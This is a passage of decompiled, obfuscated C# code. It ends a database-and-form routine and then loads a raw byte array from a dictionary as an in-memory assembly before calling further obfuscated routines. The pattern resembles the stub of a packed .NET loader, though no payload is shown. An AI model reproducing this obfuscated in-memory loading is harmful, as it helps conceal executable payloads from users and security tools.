				Sqlcmd = new SqlCommand(text4, Sqlcn);
				Sqlcmd.ExecuteNonQuery();
				Sqlcn.Close();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Interaction.MsgBox((object)ex4.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
		((Control)i1B.Forms.Ty3()).Show();
		((Form)this).Close();
	}

	internal static void q7Q0()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])Mc4.mDic[Mc4.mArray];
		assembly = Assembly.Load(rawAssembly);
		Mc4.mDic.Add("Deep", assembly);
		assembly = null;
		if (Sj1.Wi6())
		{
			z7DJ.e1DK();
		}
	}

	private void Cz1c(object sender, EventArgs e)
	{
	}
}
